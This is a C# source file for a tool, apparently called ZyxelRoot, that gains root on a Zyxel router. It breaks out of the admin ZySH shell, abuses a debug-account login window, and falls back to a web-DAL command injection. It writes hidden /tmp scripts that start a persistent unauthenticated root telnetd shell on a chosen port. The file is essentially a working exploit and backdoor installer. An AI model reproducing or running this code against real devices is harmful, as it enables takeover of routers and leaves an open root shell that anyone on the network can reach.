using System.Diagnostics;
using System.Text.RegularExpressions;

namespace ZyxelRoot;

/// <summary>
/// Starts the persistent unauthenticated root telnetd on the router.
/// </summary>
/// <remarks>
/// <see cref="StartAsync"/> uses the <c>debug</c>-account SSH bootstrap
/// (primary) and falls back to the web-DAL injection (the original Python
/// harness path) when the bootstrap fails:
/// <list type="number">
/// <item>SSH login as admin (uid 21), ZySH breakout to <c>ash</c>.</item>
/// <item>Arm the debug window: read the DAAS seed,
/// <c>write_enable_debug 2147483647</c>, and — only when the seed is
/// non-zero — <c>write_daas 1</c> + <c>ell y</c> (fresh boot = zero seed,
/// password <c>0</c>).</item>
/// <item>SSH login as <c>debug</c> → root <c>/bin/sh</c>. At most 2 attempts;
/// the window is one-shot, so the arm is repeated between them (3 failures
/// would lock the account for 600 s).</item>
/// <item>Write the daemon and launch scripts over that root channel and run
/// the launch as root — no web session involved.</item>
/// <item>Poll the TCP port until it accepts.</item>
/// </list>
/// Web fallback: the same scripts, but the launch is one DAL injection of
/// <c>sh /tmp/.zyxr&lt;tok&gt;.sh</c> (uid 0) and the output file is read back
/// over the admin SSH. The web session is logged out by
/// <see cref="WebDalClient.InjectAsync"/>.
/// </remarks>
public sealed class RootDaemonManager
{
    /// <summary>
    /// Daemon script. The <c>{port}</c> placeholder is the only substitution.
    /// </summary>
    public const string DaemonScriptTemplate = """"
#!/bin/sh
export PATH=/sbin:/bin:/usr/sbin:/usr/bin:$PATH
me=$$
for p in $(ps | grep -F '.zyxrootd' | grep -v grep | awk '{print $1}'); do [ "$p" != "$me" ] && kill $p 2>/dev/null; done
for p in $(ps | grep -F '.zyxnc' | grep -v grep | awk '{print $1}'); do kill $p 2>/dev/null; done
rm -f /tmp/.zyxncfifo
echo "rootd starting on port {port}"
exec /usr/sbin/telnetd -F -p {port} -l /bin/sh
"""";

    private static readonly Regex RcPattern = new(@"ZYXR_RC=(-?\d+)\s*$", RegexOptions.Compiled);

    private readonly ZyxelSettings _settings;
    private readonly WebDalClient _web;

    public RootDaemonManager(ZyxelSettings settings, Action<string>? log = null)
    {
        _settings = settings;
        Log = log;
        _web = new WebDalClient(
            settings.Host, settings.EffectiveWebUser, settings.EffectiveWebPassword,
            settings.DalOid, settings.DalCommandField, settings.DalCommandWrap, settings.DalPayload)
        {
            Log = log
        };
    }

    /// <summary>Diagnostic sink.</summary>
    public Action<string>? Log { get; }

    /// <summary>How many one-second probes to run before reporting failure.</summary>
    public int ProbeAttempts { get; set; } = 45;

    /// <summary>Delays between probes.</summary>
    public TimeSpan ProbeInterval { get; set; } = TimeSpan.FromSeconds(1);

    /// <summary>Builds the daemon script for a port (always newline-terminated).</summary>
    public static string BuildDaemonScript(int port) =>
        DaemonScriptTemplate.Replace("{port}", port.ToString()) + "\n";

    /// <summary>
    /// Runs the complete daemon-start flow: <c>debug</c>-SSH bootstrap first,
    /// web-DAL injection as fallback.
    /// </summary>
    public async Task<RootDaemonReport> StartAsync(CancellationToken ct = default)
    {
        string? validation = _settings.Validate();
        if (validation is not null)
            throw new ZyxelRootException(validation);

        try
        {
            return await StartViaDebugAsync(ct).ConfigureAwait(false);
        }
        catch (OperationCanceledException) when (ct.IsCancellationRequested)
        {
            throw;
        }
        catch (Exception ex)
        {
            Log?.Invoke($"debug bootstrap failed: {ex.Message}");
            Log?.Invoke("falling back to the web-DAL injection path");
        }

        return await StartViaWebAsync(ct).ConfigureAwait(false);
    }

    //
    // Primary: debug-SSH bootstrap (no web session consumed)
    //

    private async Task<RootDaemonReport> StartViaDebugAsync(CancellationToken ct)
    {
        var stopwatch = Stopwatch.StartNew();

        Log?.Invoke($"SSH {_settings.Username}@{_settings.Host}:{_settings.SshPort} (ZySH breakout)...");
        SshAdminShell admin = await SshAdminShell.OpenWithExploitAsync(_settings, Log, ct: ct).ConfigureAwait(false);

        SshShell? debug = null;
        bool zeroSeed = false;
        try
        {
            for (int attempt = 1; attempt <= DebugBootstrap.MaxLoginAttempts; attempt++)
            {
                ct.ThrowIfCancellationRequested();

                DebugBootstrap.ArmedDebug armed = await DebugBootstrap.ArmAsync(admin, Log, ct).ConfigureAwait(false);
                zeroSeed = armed.ZeroSeed;

                try
                {
                    debug = await DebugBootstrap.OpenRootOnceAsync(_settings, armed.Password, Log, ct).ConfigureAwait(false);
                    break;
                }
                catch (OperationCanceledException) when (ct.IsCancellationRequested)
                {
                    throw;
                }
                catch (Exception ex)
                {
                    // The attempt consumed the one-shot window; the next
                    // iteration re-arms before retrying.
                    Log?.Invoke($"debug login attempt {attempt}/{DebugBootstrap.MaxLoginAttempts} failed: {ex.Message}");
                }
            }

            if (debug is null)
                throw new ZyxelRootException($"debug login failed after {DebugBootstrap.MaxLoginAttempts} attempt(s) (one-shot window, re-armed between attempts)");
        }
        finally
        {
            admin.Dispose();
        }

        try
        {
            return await LaunchViaRootShellAsync(debug, zeroSeed, stopwatch, ct).ConfigureAwait(false);
        }
        finally
        {
            debug.Dispose();
        }
    }

    /// <summary>
    /// Writes the daemon and launch scripts over the root channel and runs the
    /// launch as root there, capturing the output directly through the marker
    /// protocol (no output file, no web session).
    /// </summary>
    private async Task<RootDaemonReport> LaunchViaRootShellAsync(
        SshShell root, bool zeroSeed, Stopwatch stopwatch, CancellationToken ct)
    {
        string token = MarkerShell.NewToken()[..8];
        string daemonPath = $"/tmp/.zyxrootd{token}";
        string logPath = $"/tmp/.zyxrootd{token}.log";
        string launchPath = $"/tmp/.zyxr{token}.sh";

        string daemonScript = BuildDaemonScript(_settings.RootPort);
        await root.WriteScriptAsync(daemonPath, daemonScript, ct).ConfigureAwait(false);

        CommandResult written = await root.RunAsync($"wc -c {daemonPath} 2>&1", TimeSpan.FromSeconds(10), ct)
            .ConfigureAwait(false);
        Log?.Invoke($"daemon {daemonPath}: device={written.Output.Trim()} local={daemonScript.Length}b");
        if (!written.Output.Contains(daemonScript.Length.ToString(), StringComparison.Ordinal))
            throw new ZyxelRootException($"daemon script was not written correctly (expected {daemonScript.Length} bytes, got '{written.Output.Trim()}')");

        string body = "#!/bin/sh\n" +
                      "export PATH=/sbin:/bin:/usr/sbin:/usr/bin:$PATH\n" +
                      BuildLaunchScript(daemonPath, logPath, token) + "\n" +
                      "echo ZYXR_RC=$?\n";
        await root.WriteScriptAsync(launchPath, body, ct).ConfigureAwait(false);

        CommandResult run = await root.RunAsync($"sh {launchPath}", TimeSpan.FromSeconds(30), ct)
            .ConfigureAwait(false);
        int? rc = ParseRc(run.Output, out string output);

        Log?.Invoke($"debug launch: rc={rc?.ToString() ?? "?"}");
        if (!string.IsNullOrWhiteSpace(output))
            Log?.Invoke("root script output:\n" + output);

        await root.RunAsync($"rm -f {launchPath}", TimeSpan.FromSeconds(10), ct).ConfigureAwait(false);

        (bool listening, int probes) = await ProbePortAsync(ct).ConfigureAwait(false);
        stopwatch.Stop();

        return new RootDaemonReport
        {
            Succeeded = listening,
            Port = _settings.RootPort,
            DaemonPath = daemonPath,
            LogPath = logPath,
            LaunchOutput = output,
            InjectionSummary = $"debug ssh (seed {(zeroSeed ? "zero, password 0" : "rotated")})",
            ProbeAttempts = probes,
            Elapsed = stopwatch.Elapsed,
            Path = "debug",
            Message = listening
                ? "telnetd accepts connections"
                : $"port {_settings.RootPort} did not accept within {ProbeAttempts} probes; launch exit={rc?.ToString() ?? "?"}"
        };
    }

    //
    // Fallback: web-DAL injection (the original Python-harness flow)
    //

    private async Task<RootDaemonReport> StartViaWebAsync(CancellationToken ct)
    {
        var stopwatch = Stopwatch.StartNew();
        string token = MarkerShell.NewToken()[..8];
        string daemonPath = $"/tmp/.zyxrootd{token}";
        string logPath = $"/tmp/.zyxrootd{token}.log";

        Log?.Invoke($"SSH {_settings.Username}@{_settings.Host}:{_settings.SshPort} (ZySH breakout)...");
        using SshAdminShell ssh = await SshAdminShell.OpenWithExploitAsync(_settings, Log, ct: ct).ConfigureAwait(false);

        string daemonScript = BuildDaemonScript(_settings.RootPort);
        await ssh.WriteScriptAsync(daemonPath, daemonScript, ct).ConfigureAwait(false);

        CommandResult written = await ssh.RunAsync($"wc -c {daemonPath} 2>&1", TimeSpan.FromSeconds(10), ct)
            .ConfigureAwait(false);
        Log?.Invoke($"daemon {daemonPath}: device={written.Output.Trim()} local={daemonScript.Length}b");
        if (!written.Output.Contains(daemonScript.Length.ToString(), StringComparison.Ordinal))
            throw new ZyxelRootException($"daemon script was not written correctly (expected {daemonScript.Length} bytes, got '{written.Output.Trim()}')");

        (int? rc, string output, string injection) = await RunRootScriptAsync(
            ssh, BuildLaunchScript(daemonPath, logPath, token), TimeSpan.FromSeconds(30), ct).ConfigureAwait(false);

        Log?.Invoke($"root injection: {injection}");
        if (!string.IsNullOrWhiteSpace(output))
            Log?.Invoke("root script output:\n" + output);

        (bool listening, int probes) = await ProbePortAsync(ct).ConfigureAwait(false);
        stopwatch.Stop();

        return new RootDaemonReport
        {
            Succeeded = listening,
            Port = _settings.RootPort,
            DaemonPath = daemonPath,
            LogPath = logPath,
            LaunchOutput = output,
            InjectionSummary = injection,
            ProbeAttempts = probes,
            Elapsed = stopwatch.Elapsed,
            Path = "web",
            Message = listening
                ? "telnetd accepts connections"
                : $"port {_settings.RootPort} did not accept within {ProbeAttempts} probes; script exit={rc?.ToString() ?? "?"}"
        };
    }

    /// <summary>
    /// One-shot root execution over the web path: writes a script over SSH,
    /// injects <c>sh &lt;script&gt;</c> through the web DAL, and reads the
    /// output file back.
    /// </summary>
    private async Task<(int? rc, string output, string injection)> RunRootScriptAsync(
        SshAdminShell ssh,
        string command,
        TimeSpan timeout,
        CancellationToken ct)
    {
        string token = MarkerShell.NewToken()[..8];
        string scriptPath = $"/tmp/.zyxr{token}.sh";
        string outputPath = $"/tmp/.zyxr{token}.out";

        string body = "#!/bin/sh\n" +
                      "export PATH=/sbin:/bin:/usr/sbin:/usr/bin:$PATH\n" +
                      $"exec > {outputPath} 2>&1\n" +
                      command + "\n" +
                      "echo ZYXR_RC=$?\n";

        await ssh.WriteScriptAsync(scriptPath, body, ct).ConfigureAwait(false);

        CommandResult written = await ssh.RunAsync($"wc -c {scriptPath} 2>&1", TimeSpan.FromSeconds(10), ct)
            .ConfigureAwait(false);
        Log?.Invoke($"script {scriptPath}: device={written.Output.Trim()} local={body.Length}b");

        DalResult injection = await _web.InjectAsync($"sh {scriptPath}", ct).ConfigureAwait(false);

        // Give the injected script time to run before reading its output file.
        await Task.Delay(3000, ct).ConfigureAwait(false);

        CommandResult cat = await ssh.RunAsync($"cat {outputPath}", timeout, ct).ConfigureAwait(false);
        int? rc = ParseRc(cat.Output.TrimEnd('\n'), out string output);

        await ssh.RunAsync($"rm -f {scriptPath} {outputPath}", TimeSpan.FromSeconds(10), ct).ConfigureAwait(false);

        return (rc, output, injection.Summary);
    }

    //
    // Shared helpers
    //

    /// <summary>The launch script body (daemon start + status report).</summary>
    private string BuildLaunchScript(string daemonPath, string logPath, string token) => $"""
sh {daemonPath} < /dev/null > {logPath} 2>&1 &
sleep 2
echo '--- procs ---'
ps 2>/dev/null | grep -F .zyxrootd{token} | grep -v grep
echo '--- listening ---'
netstat -tln 2>/dev/null | grep -E ':{_settings.RootPort} ' || echo PORT-NOT-LISTENING
echo '--- daemon log ---'
cat {logPath}
""";

    private async Task<(bool listening, int probes)> ProbePortAsync(CancellationToken ct)
    {
        for (int attempt = 1; attempt <= ProbeAttempts; attempt++)
        {
            ct.ThrowIfCancellationRequested();

            if (await RootShell.ProbeAsync(_settings.Host, _settings.RootPort, TimeSpan.FromSeconds(1), ct).ConfigureAwait(false))
                return (true, attempt);

            await Task.Delay(ProbeInterval, ct).ConfigureAwait(false);
        }

        return (false, ProbeAttempts);
    }

    private static int? ParseRc(string output, out string body)
    {
        body = output;

        Match match = RcPattern.Match(output);
        if (!match.Success)
            return null;

        body = output[..match.Index].TrimEnd('\n');
        return int.Parse(match.Groups[1].Value);
    }
}
